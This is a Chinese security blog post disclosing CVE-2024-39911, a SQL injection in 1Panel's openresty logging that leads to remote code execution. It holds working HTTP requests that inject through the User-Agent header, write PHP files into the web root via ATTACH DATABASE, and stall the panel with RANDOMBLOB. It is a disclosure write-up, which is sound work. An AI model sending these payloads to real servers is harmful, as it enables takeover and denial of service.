![](https://blog.mo60.cn/usr/themes/handsome/assets/img/loading.svg)
![](https://blog.mo60.cn/usr/themes/handsome/assets/img/loading.svg)

如果觉得我的文章对你有用，请随意赞赏,可备注留下ID方便感谢

* [Next](https://blog.mo60.cn/index.php/archives/1452.html "数据分析题-信息安全管理与评估-2022年省赛-环境+WP")
* [Previous](https://blog.mo60.cn/index.php/archives/kodbox-CVE-2024-4367.html "可道云(kodbox)CVE-2024-4367漏洞利用")

#### 6 comments

Loading...

2. ![](https://cravatar.cn/avatar/677d8d490f1dce4f6645482b968a357a?s=65&r=G)
   **潜心学习的道士**

   [2024-11-01 15:52](#comment-1210)

   该评论仅登录用户及评论双方可见

   [Reply](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html/comment-page-1?replyTo=1210#respond-post-1456)

   2. ![](https://cravatar.cn/avatar/43ac9263d0d2796494b591618d738ca1?s=65&r=G)
      **[Juneha](http://blog.mo60.cn/)**

      [2024-11-01 22:15](#comment-1211)

      **[@潜心学习的道士](#comment-1210)**
      该评论仅登录用户及评论双方可见

      [Reply](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html/comment-page-1?replyTo=1211#respond-post-1456)

6. ![](https://blog.mo60.cn/portrait.php?uid=VMeKw7Q8JQ2HCosgQsHwnQ%3D%3D)
   **fzr123**

   [2024-10-14 17:07](#comment-1200)

   tql

   [Reply](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html/comment-page-1?replyTo=1200#respond-post-1456)

10. ![](https://blog.mo60.cn/portrait.php?uid=q8SW1JyTiijBOgXWIH%2B8Ww%3D%3D)
    **nukaka**

    [2024-10-11 14:43](#comment-1198)

    大佬nb，学习到了

    [Reply](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html/comment-page-1?replyTo=1198#respond-post-1456)

14. ![](https://cravatar.cn/avatar/af19374f1c69537328d898cd6508686c?s=65&r=G)
    **知名的贫僧**

    [2024-07-20 02:20](#comment-1177)

    该评论仅登录用户及评论双方可见

    [Reply](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html/comment-page-1?replyTo=1177#respond-post-1456)

    2. ![](https://cravatar.cn/avatar/43ac9263d0d2796494b591618d738ca1?s=65&r=G)
       **[Juneha](http://blog.mo60.cn/)**

       [2024-07-20 12:36](#comment-1178)

       **[@知名的贫僧](#comment-1177)**
       该评论仅登录用户及评论双方可见

       [Reply](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html/comment-page-1?replyTo=1178#respond-post-1456)

#### Leave a Comment [Cancel reply](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html#respond-post-1456) 使用cookie技术保留您的个人信息以便您下次快速评论，继续评论表示您已同意该条款，评论的邮箱不会被公开仅用于接收回复。

Comment \*

Private comment

Name \*
![](https://cravatar.cn/avatar/d41d8cd98f00b204e9800998ecf8427e?s=65&r=G)

Email \*

Site

Leave a Comment
submitting...

* Popular articles
* Latest comments
* Random articles

##### Popular articles

* #### [题目+答案+2023年全国职业院校技能大赛信息安全管理与评估真题](https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html "题目+答案+2023年全国职业院校技能大赛信息安全管理与评估真题")

    浏览次数: 21606
* #### [2023年全国职业院校技能大赛信息安全管理与评估-3阶段web复盘模拟解析](https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-web1.html "2023年全国职业院校技能大赛信息安全管理与评估-3阶段web复盘模拟解析")

    浏览次数: 12499
* #### [后渗透神器Cobalt Strike使用教程](https://blog.mo60.cn/index.php/archives/16.html "后渗透神器Cobalt Strike使用教程")

    浏览次数: 10730
* #### [1Panel面板前台sql注入到网站功能rce漏洞(CVE-2024-39911)](https://blog.mo60.cn/index.php/archives/1Panel_SQLinjection2Rce.html "1Panel面板前台sql注入到网站功能rce漏洞(CVE-2024-39911)")

    浏览次数: 9490
* #### [记第一次cve申请之旅](https://blog.mo60.cn/index.php/archives/ruijie.html "记第一次cve申请之旅")

    浏览次数: 7976

##### Latest comments

* [应用分享](https://blog.mo60.cn/index.php/archives/AttachmentAccess.html/comment-page-1#comment-1310 "应用分享")

  感谢分享。
* [bai](https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html/comment-page-1#comment-1301 "bai")

  这个是国赛的题吗，如果是的话省赛的题第三阶段五个项目大概会考什么呢
* [静音](https://blog.mo60.cn/index.php/archives/2024-HeiDun.html/comment-page-1#comment-1282 "静音")

  大佬，求带带
* [看透一切的匿名人士](https://blog.mo60.cn/index.php/about.html/comment-page-1#comment-1253 "看透一切的匿名人士")

  膜拜
* [oydxlmleeg](https://blog.mo60.cn/index.php/archives/2023-HeiDun.html/comment-page-1#comment-1249 "oydxlmleeg")

  真棒！

##### Random articles

* #### [记一次趣事](https://blog.mo60.cn/index.php/archives/61.html "记一次趣事")

    浏览次数: 1994
* #### [typecho<1.2.0存储xss漏洞复现+审计+修复](https://blog.mo60.cn/index.php/archives/582.html "typecho<1.2.0存储xss漏洞复现+审计+修复")

    浏览次数: 3395
* #### [记一次校内系统渗透](https://blog.mo60.cn/index.php/archives/253.html "记一次校内系统渗透")

    浏览次数: 1925
* #### [使用arpspoof进行arp断网和ettercap来arp欺骗](https://blog.mo60.cn/index.php/archives/12.html "使用arpspoof进行arp断网和ettercap来arp欺骗")

    浏览次数: 2265
* #### [祥云杯-easygogogo](https://blog.mo60.cn/index.php/archives/207.html "祥云杯-easygogogo")

    浏览次数: 1652

##### Blog Info

* 95Posts Num
* 120Comments Num
* 5 Y 199 DOperating Days
* 2 Mouths AgoLast activity

##### Article tags

[sql注入](https://blog.mo60.cn/index.php/tag/sql%E6%B3%A8%E5%85%A5/) [1Panel](https://blog.mo60.cn/index.php/tag/1Panel/)

##### Article Directory

# 1Panel面板前台sql注入到网站功能rce漏洞(CVE-2024-39911)

Juneha • 2024 年 06 月 08 日
<h2>0x00 1Panel 架构</h2><p>1Panel 大致架构如下，面板本身是运行在宿主机上的，搭建的网站运行的其他服务等都是在docker内</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/07/2299299793.png" alt="34085-mhf27my8169.png" title="34085-mhf27my8169.png"style=""></p><p>请求日志，访问日志是在<code>1panel/openresty</code>容器里面的各种.db文件里面存储着，通过lua文件写入的, waf功能以及网站监控功能也是在<code>1panel/openresty</code>容器内实现并存储的,然后面板去读取展示</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/07/2222020475.png" alt="90461-kapnrjfpl4p.png" title="90461-kapnrjfpl4p.png"style=""></p><p>复现视频 <span class="external-link"><a class="no-external-link" href="https://www.bilibili.com/video/BV1tt8ue6EmU/" target="\_blank"><i data-feather="external-link"></i>https://www.bilibili.com/video/BV1tt8ue6EmU/</a></span></p><p><strong>漏洞在6月初发现，反馈给1p官方后，六月中修复，7月中漏洞公开</strong></p><h2>0x1 测试版本</h2><p>专业版 <code>v1.10.10-lts</code><br>社区版 <code>v1.10.10-lts</code><br><code>1panel/openresty:1.21.4.3-3-1-focal</code></p><h2>0x2 影响范围</h2><p>网站监控功能影响 == <code>1panel/openresty:1.21.4.3-3-1-focal</code><br>WAF功能影响 &lt;= <code>1panel/openresty:1.21.4.3-3-1-focal</code></p><h2>0x3 网站监控功能</h2><p>利用条件:</p><ul><li>专业版,并开启网站监控功能</li><li>关闭waf功能</li><li>安装有1P-openresty容器且搭建有php环境网站</li></ul><h3>3.1 发现注入</h3><p>这里会记录请求日志</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/2860837733.png" alt="54024-mck2p3v6af.png" title="54024-mck2p3v6af.png"style=""></p><p>他记录的字段有 re ua头等</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/920126437.png" alt="77768-th6p61i1lg.png" title="77768-th6p61i1lg.png"style=""></p><p>在记录的字段上加上单引号会发现没有成功记录日志，猜测这里存在一个inser的sql注入</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/2262924585.png" alt="73269-c7hf6jhpnmh.png" title="73269-c7hf6jhpnmh.png"style=""></p><p>进一步验证因为数据库是sqlite,我们尝试一下字符串拼功能最后记录是啥样子的,发送数据包</p><pre><code>User-Agent: Mozilla/5.0'||&quot;blog.mo60.cn&quot;||'b</code></pre><p>发现字符串被拼接了，确定了这里存在一个insert的注入</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/923456268.png" alt="84966-m75osymtreg.png" title="84966-m75osymtreg.png"style=""></p><h3>3.2 文件定位</h3><p>这个功能的数据库在</p><pre><code>/usr/local/openresty/1pwaf/data/db/sites/网站编号/site\_req\_logs.db</code></pre><p>或者在宿主机的</p><pre><code>/opt/1panel/apps/openresty/openresty/1pwaf/data/db/sites/网站代号</code></pre><p>写入数据库语句的脚本在</p><pre><code>/usr/local/openresty/1pwaf/lib/monitor\_log.lua</code></pre><p>执行的sql语句如下<br><img src="https://blog.mo60.cn/usr/uploads/2024/06/2285565036.png" alt="54224-utnmrnt1m6t.png" title="54224-utnmrnt1m6t.png"style=""></p><pre><code>INSERT INTO site\_req\_logs (
server\_name, host,ip, ip\_iso, ip\_country\_zh,
ip\_country\_en, ip\_province\_zh, ip\_province\_en,
uri, user\_agent, method, status\_code, referer,
spider, request\_time, localtime, time, request\_uri,
flow, day, hour, uv\_id, referer\_domain,
os,browser,device,pv\_tag,uv\_tag
) VALUES (
'%s', '%s', '%s', '%s', '%s',
'%s', '%s', '%s',
'%s', '%s', '%s', %d, '%s',
'%s', %d, DATETIME('now'), %f, '%s',
%d, '%s', '%s', '%s', '%s',
'%s', '%s', '%s','%s','%s'
)</code></pre><p>我们可控的位置在user\_agent头也就是</p><pre><code>VALUES (
'%s', '%s', '%s', '%s', '%s',
'%s', '%s', '%s',
'可控点', '%s', '%s', %d, '%s',
'%s', %d, DATETIME('now'), %f, '%s',
%d, '%s', '%s', '%s', '%s',
'%s', '%s', '%s','%s','%s'
)</code></pre><h3>3.3 Getshell</h3><p>这里我们先测试一下存不存在堆叠注入,先闭合前面的然后在构造插入新语句的poc</p><pre><code>GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: ua', 'blog.mo60.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');INSERT INTO &quot;main&quot;.&quot;site\_req\_logs&quot; (&quot;id&quot;, &quot;server\_name&quot;, &quot;host&quot;, &quot;ip&quot;, &quot;ip\_iso&quot;, &quot;ip\_country\_zh&quot;, &quot;ip\_country\_en&quot;, &quot;ip\_province\_zh&quot;, &quot;ip\_province\_en&quot;, &quot;ip\_longitude&quot;, &quot;ip\_latitude&quot;, &quot;uri&quot;, &quot;user\_agent&quot;, &quot;method&quot;, &quot;status\_code&quot;, &quot;referer&quot;, &quot;spider&quot;, &quot;request\_time&quot;, &quot;localtime&quot;, &quot;time&quot;, &quot;request\_uri&quot;, &quot;flow&quot;, &quot;day&quot;, &quot;hour&quot;, &quot;uv\_id&quot;, &quot;referer\_domain&quot;, &quot;os&quot;, &quot;browser&quot;, &quot;device&quot;, &quot;pv\_tag&quot;, &quot;uv\_tag&quot;)VALUES (18, '192.168.99.6', '192.168.99.6', '192.168.99.2', 'Local', 'blog.mo60.cn', 'Intranet', '', '', NULL, NULL, '/blog.mo60.cn', 'blog.mo60.cn', 'blog.mo60.cn', 114514, '', '', 1, '2024-06-09 08:16:52', 1717921010.847, '/aa', 552, '2024-06-09', '16', '', '', 'windows', 'edge', 'pc', '', '');#
Connection: close</code></pre><p>可以看到插入了我们的语句</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/3922603103.png" alt="58819-8iadv9n3g6.png" title="58819-8iadv9n3g6.png"style=""></p><p>那么我们的思路是通过堆叠注入写出文件,到网站目录下,因为网站大部分是支持php的，默认网站路径格式如下</p><pre><code>/www/sites/网站代号(默认为域名)/index/</code></pre><p>然后构造poc写入文件</p><pre><code>ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?php phpinfo();?&gt;');#</code></pre><p>然后发送数据包</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/2449810426.png" alt="80588-5f91688fbto.png" title="80588-5f91688fbto.png"style=""></p><p>然后进入容器查看一下，发现文件写入成功</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/1415654614.png" alt="58230-vmlteiqvtmq.png" title="58230-vmlteiqvtmq.png"style=""></p><p>访问成功执行</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/3250933346.png" alt="27475-qq3xv8pi72i.png" title="27475-qq3xv8pi72i.png"style=""></p><p>测试poc</p><pre><code>GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: ua', 'blog.mo60.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?= md5(&quot;blog.mo60.cn&quot;); ?&gt;');#
</code></pre><p>发送后如果写入文件并输出<code>C930b955726e241e6a7aa1e4184b54e7f</code>就是存在</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/3358073358.png" alt="96431-e1z02na9ud.png" title="96431-e1z02na9ud.png"style=""></p><p>这个利用方式在开启waf的情况下无法利用，大致示意图</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/07/933116448.png" alt="44326-xbi7siltexi.png" title="44326-xbi7siltexi.png"style=""></p><h3>3.4 功能DDOS</h3><p>这里是利用到<code>RANDOMBLOB 是SQLite数据库中的一个函数，它的主要用途是生成一个指定长度的包含随机字节的二进制大对象(BLOB)。</code>,然后传入一个<code>RANDOMBLOB(39990000)</code></p><pre><code>GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0'||RANDOMBLOB(39990000)||'blog.mo60.cn
Connection: close</code></pre><p>发送后来到请求日志查看，直接响应超时功能全部用不了</p><pre><code>http://192.168.99.6:13515/xpack/monitor/log</code></pre><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/4154199629.png" alt="30547-cvqi2iqiek4.png" title="30547-cvqi2iqiek4.png"style=""></p><p>上面的操作导致数据库文件特别大因为生成了太大字节的内容</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/2308194125.png" alt="14952-je0w6kvvrab.png" title="14952-je0w6kvvrab.png"style=""></p><h2>0x4 WAF功能</h2><p>利用条件:</p><ul><li>开启waf功能</li><li>安装有1P-openresty容器且搭建有php环境网站</li></ul><h3>4.1发现注入</h3><p>先来一条会触发waf的规则</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/3468671364.png" alt="64904-117jso5e9la9.png" title="64904-117jso5e9la9.png"style=""></p><p>可以看到在waf拦截记录里面记录了</p><pre><code>http://URL/xpack/waf/websites</code></pre><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/4119429834.png" alt="31583-o075u709kl.png" title="31583-o075u709kl.png"style=""></p><p>可以看到记录的字段跟上面也差不多</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/1487655147.png" alt="36923-jukq0to3ww.png" title="36923-jukq0to3ww.png"style=""></p><p>直接测试有没有注入</p><pre><code>User-Agent: Mozilla/5.0'||&quot;blog.mo60.cn&quot;||'b</code></pre><p>可以看到最近得到的是拼接后的结果，这里存在注入</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/1458821113.png" alt="78717-bn4faiug3u.png" title="78717-bn4faiug3u.png"style=""></p><h3>4.2文件定位</h3><p>进入op的到容器里面</p><pre><code>docker exec -it 8fbeeb7b4dbc /bin/bash</code></pre><p>数据库的路径位于,是SQLite数据库</p><pre><code>/usr/local/openresty/1pwaf/data/db/</code></pre><p>里面有两个数据库文件,<code>1pwaf.db</code> 跟 <code>req\_log.db</code>,一个是记录的waf的开关情况配置等，另外一个是我们需要的请求日志,我们的拦截日志就在这个库里面记录着</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/2652911413.png" alt="38921-k80g3gf9fc.png" title="38921-k80g3gf9fc.png"style=""></p><p>然后把db文件拷贝到宿主机上分析一下,后面发现就在1panel的文件路径里面就有不需要特意进入到容器<code>/opt/1panel/</code></p><pre><code>docker cp 8fbeeb7b4dbc:/usr/local/openresty/1pwaf/data/db/req\_log.db .</code></pre><p>可以看到我们的拦截记录就在这里面</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/438889159.png" alt="45739-wjadhcs5n5k.png" title="45739-wjadhcs5n5k.png"style=""></p><p>然后通过搜索找到的插入语句在</p><pre><code>/usr/local/openresty/1pwaf/lib/attack\_log.lua</code></pre><p>打开可以看到执行的sql语句</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/1232270155.png" alt="84835-2s8mjzqjhtg.png" title="84835-2s8mjzqjhtg.png"style=""></p><pre><code>INSERT INTO req\_logs (
id, ip, ip\_iso, ip\_country\_zh, ip\_country\_en,
ip\_province\_zh, ip\_province\_en, ip\_longitude, ip\_latitude, localtime,
time,server\_name, website\_key, host, method,
uri, user\_agent, exec\_rule, rule\_type, match\_rule, match\_value,
nginx\_log, blocking\_time, action, is\_block, is\_attack
) VALUES (
'%s', '%s', '%s', '%s', '%s',
'%s', '%s', %d, %d, DATETIME('now'),
%f, '%s', '%s', '%s', '%s',
'%s', '%s', '%s', '%s', '%s', '%s',
'%s', %d, '%s', %d, %d
)</code></pre><p>我们的可控点在第二个插入参数的位置</p><pre><code>VALUES (
'%s', '%s', '%s', '%s', '%s',
'%s', '%s', %d, %d, DATETIME('now'),
%f, '%s', '%s', '%s', '%s',
'%s', '可控点', '%s', '%s', '%s', '%s',
'%s', %d, '%s', %d, %d
)</code></pre><h3>4.3 Getshell</h3><p>先构造好poc</p><pre><code>ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?= md5(&quot;blog.mo60.cn&quot;); ?&gt;');#</code></pre><p>然后这里利用ua头位置注入来写入文件</p><pre><code>GET /.git/config HTTP/1.1
Host: 192.168.99.6
User-Agent: blog.mo60.cn',&quot;args&quot;, &quot;sqlInjectA&quot;, &quot;&quot;, &quot;YmxvZy5tbzYwLmNu&quot;, &quot;blog.mo60.cn&quot;, 0, &quot;deny&quot;, 0, 1);ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?= md5(&quot;blog.mo60.cn&quot;); ?&gt;');#
Connection: close</code></pre><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/2486712121.png" alt="58723-02pmtls4gs3q.png" title="58723-02pmtls4gs3q.png"style=""></p><p>访问成功执行</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/1277290043.png" alt="47350-n1iob8sn3z.png" title="47350-n1iob8sn3z.png"style=""></p><p><code>这里利用只要开启waf功能即可</code></p><h3>4.4 功能DDOS</h3><p>还是利用生成一大堆数据，然后让这个接口响应超时</p><pre><code>GET /.git/config HTTP/1.1
Host: 192.168.99.6
User-Agent: blog.mo60.cn'||RANDOMBLOB(79990000)||'blog.mo60.cn
Connection: close</code></pre><p>然后来到拦截日志，开始转圈圈</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/4051109451.png" alt="86580-d1b3g7jn0uf.png" title="86580-d1b3g7jn0uf.png"style=""></p><p>然后过一会提示请求错误</p><p><img src="https://blog.mo60.cn/usr/uploads/2024/06/4050549604.png" alt="22426-miscb82dww9.png" title="22426-miscb82dww9.png"style=""></p>

Article Directory

[Sitemap](https://blog.mo60.cn/index.php/sitemap.xml "Sitemap")

 |
[Feed](https://blog.mo60.cn/index.php/feed "Feed")

©  2019- 2025
[闽ICP备19012366号-1](https://beian.miit.gov.cn/ "闽ICP备19012366号-1")
[闽公网安备35052402000410](https://beian.mps.gov.cn/#/query/webSearch?code=35052402000410)


